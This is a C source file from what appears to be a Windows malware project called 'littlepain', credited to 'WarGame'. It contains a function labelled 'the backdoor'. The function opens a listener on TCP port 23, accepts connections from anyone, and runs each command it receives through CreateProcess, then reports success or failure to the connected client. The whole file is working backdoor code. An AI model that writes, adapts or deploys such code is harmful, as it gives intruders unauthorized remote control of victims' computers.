#include "littlepain.h"

/* the backdoor :) */
DWORD WINAPI BackDoor(LPVOID Data)
{
	SOCKET server_sock,client_sock;
	struct sockaddr_in serv_inf;
	struct timeval tv;
	fd_set ft;
	char exec[MAX_PATH];
	DWORD cnt;
	STARTUPINFO inf_prog;
    PROCESS_INFORMATION info_pr;

	if((server_sock = socket(AF_INET,SOCK_STREAM,
		IPPROTO_TCP)) == INVALID_SOCKET)
	{
		return 0;
	}
	
	serv_inf.sin_family = AF_INET;
	serv_inf.sin_addr.s_addr = htonl(INADDR_ANY);
	serv_inf.sin_port = htons(23);

	if(bind(server_sock,(struct sockaddr *)&serv_inf,
		sizeof(struct sockaddr_in)) == SOCKET_ERROR)
	{
		return 0;
	}
	
	listen(server_sock,SOMAXCONN);

	/* main loop! */
	while(1)
	{
		client_sock = accept(server_sock,NULL,0);

		tv.tv_usec = 0;
		tv.tv_sec = 60;

		FD_ZERO(&ft);
		FD_SET(client_sock,&ft);
		
		/* send a msg */
		send(client_sock,"[:: littlepain ::] by WarGame\r\n",31,0);
		
		while(1)
		{

		   if(select(client_sock+1,&ft,NULL,NULL,&tv) > 0)
		   {
			   memset(exec,0,MAX_PATH);
			   recv(client_sock,exec,MAX_PATH,0);

			   /* remove "\r" and "\n" */
			   for(cnt = 0;cnt < strlen(exec);cnt++)
			   {
				   if(exec[cnt] == '\r' || exec[cnt] == '\n')
				   {
					   exec[cnt] = 0;
				   }
			   }

			   /* (try to) execute the command */
			   memset(&inf_prog,0,sizeof(STARTUPINFO));
			   memset(&info_pr,0,sizeof(PROCESS_INFORMATION));
			   
			   inf_prog.cb = sizeof(STARTUPINFO);
               inf_prog.dwFlags = STARTF_USESHOWWINDOW;
               inf_prog.wShowWindow = SW_SHOW;
               
			   if(CreateProcess(NULL,exec,NULL,NULL,FALSE,CREATE_NEW_CONSOLE,
				   NULL,NULL,&inf_prog,&info_pr))
			   {
				   send(client_sock,"Executed!\r\n",11,0);
			   }

			   else 
			   {
				   send(client_sock,"Not Executed!\r\n",15,0);
			   }
		   }
		
		   else
		   {
			 closesocket(client_sock);
			 break;
		   }
		
		}
	}
}